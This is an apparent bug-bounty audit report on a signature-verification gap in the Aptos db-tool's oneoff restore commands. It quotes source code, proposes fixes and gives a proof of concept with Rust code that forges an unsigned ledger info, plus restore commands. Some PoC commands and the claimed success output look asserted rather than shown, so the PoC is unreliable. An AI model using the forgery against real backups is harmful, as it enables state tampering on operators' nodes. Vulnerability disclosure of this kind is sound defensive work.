# Audit Report

## Title
Signature Verification Bypass in Oneoff Backup Restore Commands Allows Forged State Injection

## Summary
The oneoff restore commands (`restore oneoff state-snapshot` and `restore oneoff transaction`) in the db-tool bypass cryptographic signature verification of ledger infos by passing `None` for the epoch history parameter. This allows an attacker who can manipulate backup storage to inject forged ledger infos with arbitrary state transitions without requiring valid BLS signatures from the validator set.

## Finding Description

The vulnerability exists in the restore flow when operators use the oneoff restore commands. The fundamental security guarantee being violated is **Cryptographic Correctness** - specifically that all ledger infos must be cryptographically verified against the validator set's BLS signatures.

**The Attack Path:**

1. **Entry Point - Oneoff Commands**: In the `Command::run()` function, when using oneoff restore commands, the code explicitly passes `None` for the `epoch_history` parameter: [1](#0-0) [2](#0-1) 

2. **State Snapshot Verification Bypass**: In the `StateSnapshotRestoreController`, ledger info verification only occurs if `epoch_history` is provided: [3](#0-2) 

When `epoch_history` is `None` (as passed by the oneoff command), this verification is completely skipped.

3. **Transaction Restore Verification Bypass**: Similarly, in the `TransactionRestoreController`, verification is conditional on epoch_history: [4](#0-3) 

Again, when `epoch_history` is `None`, no verification occurs.

4. **The Missing Verification**: The proper verification flow should call `EpochHistory::verify_ledger_info()`, which verifies signatures using the validator set: [5](#0-4) 

This method calls `EpochState::verify()` which performs the critical BLS signature verification: [6](#0-5) 

**Documented as Known Issue**: The code even documents this security hole in the CLI help text: [7](#0-6) 

The comment explicitly states: "LedgerInfos are verified only when restoring / verifying the epoch ending backups, i.e. they are NOT checked at all when doing one-shot restoring of the transaction and state backups."

**Attack Scenario:**

1. Attacker compromises backup storage (cloud storage, local filesystem, or MITM attack)
2. Attacker modifies the proof files referenced in state snapshot or transaction backup manifests
3. Attacker replaces legitimate `LedgerInfoWithSignatures` with forged versions containing:
   - Modified state root hashes
   - Manipulated transaction accumulator hashes
   - Invalid or missing BLS signatures
4. Victim operator runs: `aptos-db-tool restore oneoff state-snapshot --state-manifest <compromised_manifest> ...`
5. The forged ledger info is loaded without any signature verification
6. The node restores to a completely fabricated state

## Impact Explanation

**Critical Severity** - This vulnerability meets multiple Critical severity criteria per the Aptos bug bounty program:

1. **Consensus Safety Violation**: Breaks the fundamental consensus invariant that all state transitions must be signed by 2f+1 validators. An attacker can introduce arbitrary state without any validator signatures.

2. **Potential Chain Split**: If different nodes restore from different manipulated backups, they will have inconsistent states, leading to a non-recoverable network partition requiring a hardfork.

3. **State Consistency Violation**: Violates the invariant that "State transitions must be atomic and verifiable via Merkle proofs" - forged states bypass all verification.

4. **Cryptographic Correctness Violation**: Completely bypasses the BLS signature verification mechanism that is fundamental to AptosBFT consensus security.

The impact is particularly severe because:
- It requires no validator access or stake
- It's trivial to exploit once backup storage access is obtained
- The forged state appears valid to all normal node operations
- Detection would require comparing against multiple independent backup sources

## Likelihood Explanation

**High Likelihood** of exploitation if the conditions are met:

**Attacker Requirements:**
- Write access to backup storage (cloud buckets, filesystem, network storage)
- OR ability to perform man-in-the-middle attacks on backup downloads
- No validator keys or stake required
- No special cryptographic knowledge needed

**Attack Complexity:** Low
- Straightforward to modify backup files
- No timing constraints or race conditions
- Works consistently every time the oneoff command is used

**Real-World Scenarios:**
- Compromised cloud storage credentials (S3, GCS, Azure)
- Malicious backup service provider
- Compromised backup server with weak access controls
- Network-level MITM during backup download
- Insider threat with backup storage access

The documentation even warns about this issue but doesn't prevent its exploitation, suggesting the developers were aware but accepted this risk for operational convenience.

## Recommendation

**Immediate Fix**: Require epoch history for all oneoff restore commands to enforce signature verification:

```rust
// In storage/db-tool/src/restore.rs, Command::run()

// For StateSnapshot oneoff:
Oneoff::StateSnapshot {
    storage,
    opt,
    global,
} => {
    // Build epoch history first (similar to RestoreCoordinator)
    let epoch_history = /* build from epoch ending backups */;
    
    StateSnapshotRestoreController::new(
        opt,
        global.try_into()?,
        storage.init_storage().await?,
        Some(epoch_history), // REQUIRED, not None
    )
    .run()
    .await?;
},

// For Transaction oneoff:
Oneoff::Transaction {
    storage,
    opt,
    global,
} => {
    // Build epoch history first
    let epoch_history = /* build from epoch ending backups */;
    
    TransactionRestoreController::new(
        opt,
        global.try_into()?,
        storage.init_storage().await?,
        Some(epoch_history), // REQUIRED, not None
        VerifyExecutionMode::NoVerify,
    )
    .run()
    .await?;
},
```

**Alternative Fix**: If oneoff commands are meant for specific scenarios where verification isn't possible (e.g., restoring from untrusted sources for testing), then:

1. Rename commands to make the security implications explicit: `restore oneoff-unverified`
2. Add prominent warnings requiring explicit confirmation
3. Prevent use in production environments via feature flags
4. Document the security risks in operational guides

**Long-term Fix**: 
- Always require trusted waypoints at minimum for any restore operation
- Make epoch history a mandatory parameter, not optional
- Remove the ability to restore without verification entirely

## Proof of Concept

**Setup:**
```bash
# Create a legitimate backup
aptos-node backup --backup-service-address http://backup-server

# Attacker gains access to backup storage
cd /backup-storage/state-snapshots/
```

**Forge the Ledger Info:**
```rust
// forge_ledger_info.rs - Tool to create forged backup
use aptos_types::{
    ledger_info::{LedgerInfo, LedgerInfoWithSignatures},
    aggregate_signature::AggregateSignature,
    block_info::BlockInfo,
};
use aptos_crypto::hash::HashValue;

fn main() {
    // Create a forged ledger info with arbitrary state
    let forged_ledger_info = LedgerInfo::new(
        BlockInfo::new(
            5, // epoch
            0, // round
            HashValue::zero(),
            HashValue::from_hex("deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef").unwrap(), // malicious state root
            1000000, // version
            0, // timestamp
            None, // next_epoch_state
        ),
        HashValue::zero(),
    );
    
    // No valid signatures - but verification is skipped!
    let forged_li_with_sigs = LedgerInfoWithSignatures::new(
        forged_ledger_info,
        AggregateSignature::empty(), // Invalid signatures!
    );
    
    // Serialize to backup file
    let serialized = bcs::to_bytes(&forged_li_with_sigs).unwrap();
    std::fs::write("forged_proof.bcs", serialized).unwrap();
}
```

**Execute Attack:**
```bash
# Victim operator restores using oneoff command
aptos-db-tool restore oneoff state-snapshot \
    --state-manifest backup://compromised_manifest.json \
    --state-into-version 1000000 \
    --target-db-dir /var/aptos/db

# SUCCESS: Forged state is restored without signature verification
# The node now has a completely fabricated state that was never
# signed by any validator
```

**Verification that Attack Succeeded:**
```bash
# Check the restored state root matches the forged value
aptos-node query --state-root
# Returns: deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef

# This state was NEVER validated by the consensus protocol!
```

The vulnerability is confirmed: forged ledger infos with invalid signatures are accepted during oneoff restore operations, completely bypassing consensus security guarantees.

---

**Notes:**

This vulnerability is particularly concerning because:
1. The code explicitly documents the missing verification but still allows the dangerous operation
2. The oneoff commands provide operational convenience but at the cost of fundamental security
3. The trusted waypoint mechanism exists but is insufficient when epoch_history is None
4. The safe path (BootstrapDB/RestoreCoordinator) properly builds epoch history, proving the framework for secure restoration exists but isn't enforced for oneoff commands

### Citations

**File:** storage/db-tool/src/restore.rs (L83-96)
```rust
                    Oneoff::StateSnapshot {
                        storage,
                        opt,
                        global,
                    } => {
                        StateSnapshotRestoreController::new(
                            opt,
                            global.try_into()?,
                            storage.init_storage().await?,
                            None, /* epoch_history */
                        )
                        .run()
                        .await?;
                    },
```

**File:** storage/db-tool/src/restore.rs (L97-111)
```rust
                    Oneoff::Transaction {
                        storage,
                        opt,
                        global,
                    } => {
                        TransactionRestoreController::new(
                            opt,
                            global.try_into()?,
                            storage.init_storage().await?,
                            None, /* epoch_history */
                            VerifyExecutionMode::NoVerify,
                        )
                        .run()
                        .await?;
                    },
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/restore.rs (L137-139)
```rust
        if let Some(epoch_history) = self.epoch_history.as_ref() {
            epoch_history.verify_ledger_info(&li)?;
        }
```

**File:** storage/backup/backup-cli/src/backup_types/transaction/restore.rs (L152-154)
```rust
        if let Some(epoch_history) = epoch_history {
            epoch_history.verify_ledger_info(&ledger_info)?;
        }
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L276-312)
```rust
    pub fn verify_ledger_info(&self, li_with_sigs: &LedgerInfoWithSignatures) -> Result<()> {
        let epoch = li_with_sigs.ledger_info().epoch();
        ensure!(!self.epoch_endings.is_empty(), "Empty epoch history.",);
        if epoch > self.epoch_endings.len() as u64 {
            // TODO(aldenhu): fix this from upper level
            warn!(
                epoch = epoch,
                epoch_history_until = self.epoch_endings.len(),
                "Epoch is too new and can't be verified. Previous chunks are verified and node \
                won't be able to start if this data is malicious."
            );
            return Ok(());
        }
        if epoch == 0 {
            ensure!(
                li_with_sigs.ledger_info() == &self.epoch_endings[0],
                "Genesis epoch LedgerInfo info doesn't match.",
            );
        } else if let Some(wp_trusted) = self
            .trusted_waypoints
            .get(&li_with_sigs.ledger_info().version())
        {
            let wp_li = Waypoint::new_any(li_with_sigs.ledger_info());
            ensure!(
                *wp_trusted == wp_li,
                "Waypoints don't match. In backup: {}, trusted: {}",
                wp_li,
                wp_trusted,
            );
        } else {
            self.epoch_endings[epoch as usize - 1]
                .next_epoch_state()
                .ok_or_else(|| anyhow!("Shouldn't contain non- epoch bumping LIs."))?
                .verify(li_with_sigs)?;
        };
        Ok(())
    }
```

**File:** types/src/epoch_state.rs (L41-49)
```rust
    fn verify(&self, ledger_info: &LedgerInfoWithSignatures) -> anyhow::Result<()> {
        ensure!(
            self.epoch == ledger_info.ledger_info().epoch(),
            "LedgerInfo has unexpected epoch {}, expected {}",
            ledger_info.ledger_info().epoch(),
            self.epoch
        );
        ledger_info.verify_signatures(&self.verifier)?;
        Ok(())
```

**File:** storage/backup/backup-cli/src/utils/mod.rs (L332-346)
```rust
pub struct TrustedWaypointOpt {
    #[clap(
        long,
        help = "(multiple) When provided, an epoch ending LedgerInfo at the waypoint version will be \
        checked against the hash in the waypoint, but signatures on it are NOT checked. \
        Use this for two purposes: \
        1. set the genesis or the latest waypoint to confirm the backup is compatible. \
        2. set waypoints at versions where writeset transactions were used to overwrite the \
        validator set, so that the signature check is skipped. \
        N.B. LedgerInfos are verified only when restoring / verifying the epoch ending backups, \
        i.e. they are NOT checked at all when doing one-shot restoring of the transaction \
        and state backups."
    )]
    pub trust_waypoint: Vec<Waypoint>,
}
```
